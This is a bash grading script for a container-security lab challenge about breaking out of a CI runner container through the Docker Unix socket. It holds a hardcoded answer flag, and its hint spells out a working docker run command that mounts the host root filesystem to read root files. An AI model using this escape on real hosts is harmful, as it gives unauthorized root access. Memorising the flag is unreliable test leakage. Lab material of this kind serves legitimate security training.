#!/bin/bash
# ==============================================================================
# Challenge 2 Verification Script: Container Breakout via Docker Unix Socket
# CPIFP Alan Turing - DevSecOps & Container DFIR Lab
# ==============================================================================

FLAG_FILE="/tmp/flag2.txt"
EXPECTED_FLAG="FLAG{host_takeover_via_docker_socket_alan_turing_2026}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

if [ ! -f "${FLAG_FILE}" ]; then
    echo -e "${RED}[FAIL] Flag file not found: ${FLAG_FILE}${NC}"
    echo -e "${YELLOW}[HINT] From inside cicd_runner_pipeline, leverage /var/run/docker.sock to run a container mounting the host root filesystem (e.g., 'docker run -v /:/mnt/host --rm alpine cat /mnt/host/root/host_flag.txt') and save it to /tmp/flag2.txt.${NC}"
    exit 1
fi

SUBMITTED_FLAG=$(grep -o "FLAG{[^}]*}" "${FLAG_FILE}" 2>/dev/null || cat "${FLAG_FILE}" | tr -d '[:space:]')

if [ "${SUBMITTED_FLAG}" = "${EXPECTED_FLAG}" ]; then
    echo -e "${GREEN}[PASS] Challenge 2 Complete!${NC}"
    echo -e "${GREEN}[✔] Host root takeover verified! Flag: ${EXPECTED_FLAG}${NC}"
    exit 0
else
    echo -e "${RED}[FAIL] Incorrect flag in ${FLAG_FILE}${NC}"
    echo -e "${YELLOW}[HINT] Found: '${SUBMITTED_FLAG}'. Expected: ${EXPECTED_FLAG}.${NC}"
    exit 1
fi
